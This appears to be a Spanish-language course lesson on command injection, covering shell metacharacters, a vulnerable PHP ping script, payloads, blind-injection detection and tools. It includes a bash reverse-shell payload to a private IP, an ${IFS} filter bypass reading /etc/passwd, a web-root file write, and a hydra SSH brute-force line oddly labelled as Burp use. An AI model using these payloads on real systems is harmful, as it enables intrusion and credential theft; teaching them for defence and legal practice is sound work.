Escapando del contexto de un comando

Duración: 8:15 · Sección 2: Temario

El command injection (o inyección de comandos) ocurre cuando un atacante logra insertar comandos arbitrarios del sistema a través de una aplicación vulnerable. Esto sucede cuando la aplicación pasa datos del usuario directamente al shell sin sanitizarlos.

Metacaracteres de escape

El shell interpreta ciertos caracteres de forma especial. Si una aplicación los acepta sin filtrar, podemos inyectar comandos:

CarácterFunciónEjemplo
;Separador de comandosls ; id
&&Ejecuta si el anterior tuvo éxitocd /tmp && whoami
||Ejecuta si el anterior fallócd /inexistente || ls
$(...)Subshell con sustituciónecho $(whoami)
`...`Sustitución de comando (antigua)echo `whoami`
|Pipe (redirige salida a otro comando)ls | grep txt

Ejemplo clásico en aplicaciones web

Imagina una web que hace ping a una IP ingresada por el usuario:

// Código vulnerable en PHP
$ip = $_GET['ip'];
system("ping -c 4 " . $ip);

// Si el usuario envía: ip=127.0.0.1; whoami
// Se ejecuta: ping -c 4 127.0.0.1; whoami

Un payload típico de command injection:

# Payload básico
127.0.0.1; whoami

# Reverse shell
127.0.0.1; bash -i >& /dev/tcp/192.168.1.5/4444 0>&1

# Omitir filtros con sustituciones
127.0.0.1$(whoami)
127.0.0.1`whoami`

# Bypass de filtros de espacios con ${IFS}
127.0.0.1;cat${IFS}/etc/passwd

Blind command injection

A veces no vemos la salida del comando. Podemos detectarlo con técnicas basadas en tiempo o en efectos colaterales:

# Detección por tiempo (sleep)
127.0.0.1; sleep 5

# Detección por efecto externo (ping hacia nuestro servidor)
127.0.0.1; ping -c 5 192.168.1.5

# Detección por escritura en web accesible
127.0.0.1; echo injected > /var/www/html/evidence.txt

Herramientas de detección

Existen herramientas que automatizan la detección de command injection:

# Commix (recursivo, potente)
python commix.py --url="http://target.com/page?ip=127.0.0.1"

# Incluir Burp Suite como proxy para análisis manual
hydra -l usuario -P wordlist.txt ssh://target  # Modo semi-automático
⚠️ El command injection es una de las vulnerabilidades más críticas en OWASP Top 10. Siempre sanitiza las entradas del usuario usando funciones como escapeshellarg() o escapeshellcmd().
📖 Para practicar command injection de forma legal, usa plataformas como HackTheBox, TryHackMe, o laboratorios locales con DVWA (Damn Vulnerable Web Application).
